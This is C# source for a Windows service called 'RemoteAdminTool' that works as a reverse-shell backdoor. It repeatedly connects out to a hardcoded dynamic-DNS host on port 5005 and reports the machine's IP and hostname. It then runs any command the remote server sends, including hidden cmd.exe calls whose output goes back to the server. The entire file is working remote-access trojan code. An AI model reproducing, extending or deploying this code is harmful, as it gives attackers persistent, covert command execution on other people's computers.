using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using System.Net.Sockets;
using System.Net;
using System.Threading;


namespace RemoteAdminTool
{
    public partial class Service1 : ServiceBase
    {
        Socket server;
        byte[] buffer;
        int bufferSize = 1024;
        Process cmd;
        string mySesionId;
        public Service1()
        {
            InitializeComponent();
            server = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            new Thread(new ThreadStart(cloc)).Start();
            
            
        }
        protected void cloc()
        {
            while (true)
            {
                try
                {
                    if (!server.Connected )
                    {
                        server = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                        IPAddress serverIP = new IPAddress(new byte[] { 192, 168, 1, 101 });
#if DEBUG
                        serverIP = new IPAddress(new byte[] { 192, 168, 1, 101 });
#else
                        try
                        {
                            serverIP = Dns.GetHostEntry("xoxoxoms.ddns.net").AddressList[0];
                        }
                        catch
                        {
                            Stop();
                        }
#endif
                        server.BeginConnect(new IPEndPoint(serverIP, 5005), OnConnect, server);
                        
                        

                    }
                }
                catch { }
                Thread.Sleep(7760);
            }
        }

        protected override void OnStart(string[] args)
        {
          
        }
        protected void OnConnect(IAsyncResult ar)
        {
            try {
                Socket conn =(Socket) ar.AsyncState;
                conn.EndConnect(ar);
                
                
                buffer = new byte[1024];
                
                conn.BeginReceive(buffer, 0, bufferSize, 0, OnReceive, conn);
                
            }
            catch(Exception e)
            {
                Console.WriteLine(e.ToString());
            }
        }
        
        protected void OnReceive(IAsyncResult ar)
        {
            Socket rc = (Socket)ar.AsyncState;
            try {
               
                int size = rc.EndReceive(ar);
                
                MyDecode(size, rc);
                
                
            }
            catch(Exception ex) {
                Console.WriteLine(ex.ToString());

            }
        }

        protected void MyDecode(int size, Socket snd)
        {
            string com = Encoding.ASCII.GetString(buffer).Substring(0, size);
            buffer = new byte[bufferSize];
            snd.BeginReceive(buffer, 0, bufferSize, 0, OnReceive, snd);
            
            string processName = com.Split(' ')[0];
            string[] argz = com.Split(' ');
            string arg = string.Empty;
            for (int i = 1; i < argz.Length; i++)
                arg += (argz[i] + ' ');
            cmd = new Process();
            cmd.StartInfo.FileName = processName;
            cmd.StartInfo.Arguments = arg;
            if (processName == "Identify")
            {
                mySesionId = arg.Split(' ')[0];
                string myMsg = "IP " + Dns.GetHostEntry(Dns.GetHostName()).AddressList[0].ToString();
                myMsg += (' ' + Dns.GetHostName());
                MySend(myMsg, myMsg.Length, snd);
            }
            else if (processName == "cmd")
            {
                cmd.StartInfo.RedirectStandardOutput = true;
                cmd.StartInfo.CreateNoWindow = true;
                cmd.StartInfo.UseShellExecute = false;
                cmd.StartInfo.Arguments = "/c" + arg;
                //cmd.StartInfo.RedirectStandardError = true;
                cmd.Start();
                cmd.WaitForExit(1000);
                string output = cmd.StandardOutput.ReadToEnd();
                MySend(output, output.Length, snd);
            }
            else
            {
                cmd.Start();
            }
        }

        protected void MySend(string s, int size,Socket conn)
        {
            try
            {
                conn.BeginSend(Encoding.ASCII.GetBytes(s), 0, size, 0, OnSend, conn);
            }
            catch { }
            
        }

        protected void OnSend(IAsyncResult ar)
        {
            try
            {
                ((Socket)ar.AsyncState).EndSend(ar);
            }
            catch { }
        }
        protected override void OnStop()
        {
            server.Shutdown(SocketShutdown.Both);
        }

        public void onDebug()
        {
            OnStart(null);
        }

        private void TryToConnectToServer_Tick(object senderz, EventArgs e)
        {

        }
    }
}
